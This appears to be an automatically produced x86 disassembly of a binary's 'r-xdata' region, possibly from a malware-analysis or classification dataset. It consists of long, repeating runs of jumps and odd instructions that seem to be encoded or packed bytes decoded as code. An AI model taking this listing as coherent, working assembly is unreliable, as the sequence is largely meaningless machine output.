mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4771b0
jmp r-xdata
xchg ebx eax
jne r-xdata
jpo r-xdata
jpo r-xdata
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
jmp r-xdata
shr [ ebx + 0x7b ] 0x7b
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jg r-xdata
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
imul esi eax 0x26f21da4
aas
pop esi
stosb [ edi ]
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
aas
xchg ebx eax
in eax 0x37
daa
jmp r-xdata
jpo r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
jpo r-xdata
aaa
jmp r-xdata
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
pop eax
jpo r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
test bl ch
jmp sub_4772dd
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
jpe r-xdata
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4771c1
fild [ esi - 0x7bd47b7c ]
sub al 0x2b
xchg edx eax
pop esi
jmp r-xdata
jpo r-xdata
pop eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
daa
jmp r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4771d0
sub al 0xf2
and eax 0x52759333
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jne r-xdata
aas
xchg ebx eax
in eax 0x37
jpo r-xdata
jpo r-xdata
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
imul esi eax 0x26f21da4
aas
jmp r-xdata
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
shr [ ebx + 0x7b ] 0x7b
jg r-xdata
jpo r-xdata
pop esi
stosb [ edi ]
outsb
jpo r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
daa
jmp r-xdata
jpo r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
jpo r-xdata
aaa
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
pop eax
jpo r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
jpe r-xdata
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_47721d
cmp esp [ ebx + 0x78 ]
cmp [ eax - 0x5e ] 0x78
mov dl [ edx + 0x7b7b46d1 ]
mov [ 0xffffffffd1928a78 ] al
inc esi
jpo r-xdata
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
or [ esi + edi + 0x140814a7 ] edi
jmp r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
adc al 0x1d
mov esp 0x5b0f9b3e
sub_477285
xchg ebx eax
xor [ 0x3ebc3036 ] ch
xchg edi eax
sub eax 0x1d2d3036
mov esp 0x7b368b3e
mov esp 0x1236a33e
sbb [ ecx ] cl
mov esp 0x814a73e
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
sub_4772b9
jmp r-xdata
and al 0x7d
jpo r-xdata
jpo r-xdata
jmp sub_4772d7
jmp r-xdata
push cs
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
test [ ebx + ebp * 8 - 0x4849ec15 ] al
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jpo r-xdata
jmp r-xdata
push cs
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
jpo r-xdata
xchg edx eax
bsr ebp [ edx + edx * 4 ]
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
ja r-xdata
test [ esi ] cl
jpo r-xdata
jmp r-xdata
jmp r-xdata
jo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
jpo r-xdata
aaa
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
dec ebx
and bl [ edi ]
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4772d7
jmp r-xdata
test [ esp + eax * 4 - 0x49ec1415 ] eax
mov bh 0xf
mov ebp 0x6a97922c
jpo r-xdata
inc ebx
jpo r-xdata
jmp r-xdata
xchg edx eax
jo r-xdata
jmp r-xdata
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jg r-xdata
jmp r-xdata
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
jpo r-xdata
jmp r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
xchg edx eax
xchg edx eax
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
dec ebx
and bl [ edi ]
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_4772dd
jmp r-xdata
jmp r-xdata
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
jpo r-xdata
xchg edx eax
jpo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
sub_4772df
mov ebx 0x2b2db248
xchg edx eax
and al 0x7d
jpo r-xdata
jpo r-xdata
jmp sub_4772d7
jmp r-xdata
push cs
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
test [ ebx + ebp * 8 - 0x4849ec15 ] al
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jpo r-xdata
jmp r-xdata
push cs
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
jpo r-xdata
xchg edx eax
bsr ebp [ edx + edx * 4 ]
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
ja r-xdata
test [ esi ] cl
jpo r-xdata
jmp r-xdata
jmp r-xdata
jo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
jpo r-xdata
aaa
jpo r-xdata
pop esi
jpo r-xdata
jpo r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
dec ebx
and bl [ edi ]
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477313
jmp r-xdata
mov edx [ edi ]
dec eax
dec ecx
jpo r-xdata
jpo r-xdata
add [ edi + 0x11eb8484 ] 0x3ef21d12
xchg ebp eax
jpo r-xdata
jpo r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
jmp r-xdata
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xchg edx eax
xchg edx eax
xchg edx eax
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
xchg esi eax
push 0x7b
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
sub_477345
jmp r-xdata
adc [ edx ] edx
sbb eax 0x92953ef2
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
mov [ ebp - 0x14147b7c ] 0x13
mov dh 0xb7
bsr ebp [ edx + edx * 4 ]
xchg esi eax
push 0x7b
jpo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
test bl ch
sub_477349
xchg esi eax
push 0x6f927b7b
inc ebx
jpo r-xdata
xchg edx eax
jo r-xdata
jmp r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jg r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
jpo r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg [ esp + eax * 4 + 0x1d1211eb ] eax
xchg ebp eax
xchg edx eax
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
xchg edi eax
push 0x7b
jpo r-xdata
jg r-xdata
xchg esi eax
push 0x7b
jpo r-xdata
test bl ch
adc [ edx ] edx
sbb eax 0x92953ef2
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
retn
jmp r-xdata
jpo r-xdata
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
dec ebx
